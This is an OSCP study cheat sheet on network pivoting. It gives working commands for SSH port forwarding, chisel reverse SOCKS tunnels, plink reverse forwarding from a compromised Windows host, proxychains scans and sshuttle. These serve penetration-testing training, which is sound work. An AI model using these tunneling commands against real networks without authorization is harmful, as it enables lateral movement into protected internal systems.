<div id="top"></div>

  <h3 align="center">Pivoting</h3>

  <p align="center">
    Pivoting for OSCP exam
  </p>
</div>

<!-- ABOUT THE PROJECT -->
## General

<h4>Tunneling</h4>

* Local Port Forwarding = Forwarding a local port from the local machine to the compromised machine.
* Remote Port Forwarding = You don't have credentials but do have a shell and want to access the webserver from your kali machine
* Dynamic Port Forwarding = Open SOCKSv5 Proxy to all ports on the destination host

    ssh –N –L 127.0.0.1:445:192.168.1.110:445 student@192.168.10.10<br>
    ssh -f -N -T -R 5555:127.0.0.1:5555 student@192.168.155.52 -p 2222<br>
    ssh –D 1080 student@10.10.10.10 -p 2222

<h4>Pivot WINDOWS (compromised) -> Attacker machine SOCKS-Tunnel <3...</h4>
  
Scenario: WINDOWS host has two network interfaces with Network A & Network B.
Attacker can only reach Network A, but wants to access Network B.
For this 'chisel' can be used.
  
Attacker machine:
  chisel server -p 8000 --reverse
  
Compromised Windows host:
  
 .\chisel64.exe client 192.168.119.248:8000 R:socks 

Scanning from attacker machine:
  
  proxychains nmap -sT -v 10.1.1.1 -Pn --open
  [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.1.1.1:22  ...  OK
  Discovered open port 22/tcp on 10.1.1.1

<h4>Pivot with plink.exe</h4>
From compromised Windows host upload plink.exe and run the following command to open up e.g. SMB:

    cmd.exe /c echo y | C:\Users\Administrator\Documents\plink.exe -ssh -N -l kali -pw kali -R 192.168.119.248:445:10.1.1.31:445 192.168.119.248

Explained:
cmd.exe /c echo y | plink.exe -ssh -l [attacker_username] -pw [attacker_ssh_password] -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]

Then scanning on the attacker machine will result in:

    nmap -p 445 -T4 -v 127.0.0.1
    Discovered open port 445/tcp on 127.0.0.1
    Completed Connect Scan at 15:14, 0.00s elapsed (1 total ports)
    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.00011s latency).
    PORT    STATE SERVICE
    445/tcp open  microsoft-ds

Crackmapexec will now show:

    SMB 127.0.0.1 445 HOSTNAME [*] Windows Server 2016 Standard 14393 (name:xxx) (domain:xxx) (signing:False) (SMBv1:True)

<h4>Pivot with SSH & ProxyChains</h4>

This method leverages SSH with dynamic port forwarding to create a socks proxy, with proxychains to help with tools that can't use socks proxies. You can leverage this tunnel two ways:

* In a tool, configure a SOCKS proxy and point it to the SSH tunnel. This works great in tools that support it like Burp.
* Run a command with proxychains, which tunnels data over the SSH proxy.

This method allows mostly complete access to the target network, with few limitations, and is generally my preferred way to access gated networks. It requires the following pre-conditions to leverage:

 * Access on target machine
 * SSH service running on target machine and reachable from the attacker machine.
 * A password compromise or writing of a public key for entry, to a user that allows remote SSH login.

Non-root accounts may limit some tools from working fully (such as nmap), when creating certain types of packets are root only activities.

<h5>Setting up the tunnel</h5>

    ssh -N -D 127.0.0.1:7080 sshuser-hosta@192.168.2.20

* ssh = Command
* -N = Do not send a remote command
* -D = Dynamic Port Forward
* 127.0.0.1:7080 = The proxy port to send traffic to on the local machine (pentester machine)
* sshuser-hosta@192.168.2.20 = The target server we want to pivot to.

<h5>Setup ProxyChains</h5>

In /etc/proxychains4.conf (or similar depending on version), add the following to the end of the file:

    socks5 127.0.0.1 9000

Run commands:

    $ proxychains nmap -sV webgoat
    Nmap scan report for webgoat (224.0.0.1)
    Host is up (0.00027s latency).
    rDNS record for 224.0.0.1: all-systems.mcast.net
    Not shown: 998 closed ports
    PORT     STATE SERVICE    VERSION
    8080/tcp open  http-proxy
    9001/tcp open  jdbc       HSQLDB JDBC (Network Compatibility Version 2.3.4.0)
  
<h4>Pivoting with sshuttle</h4>

Once we have used the command below we can access the underlying subnet (third .3.x). When we access an IP address from this subnet the traffic will be picked up by sshuttle and sent over the intermediate machine (HostA) to the third subnet. So we can perfectly execute the following command without the intervention of any other proxy tools like Proxychains because all ports are forwarded:

    sshuttle -v -r sshuser-hosta@192.168.2.20 192.168.3.0/24
    
 Install: apt install sshuttle
 
 Also see: https://jarnobaselier.nl/pivoting-technieken-ssh-tunneling/

<p align="right">(<a href="#top">back to top</a>)</p>
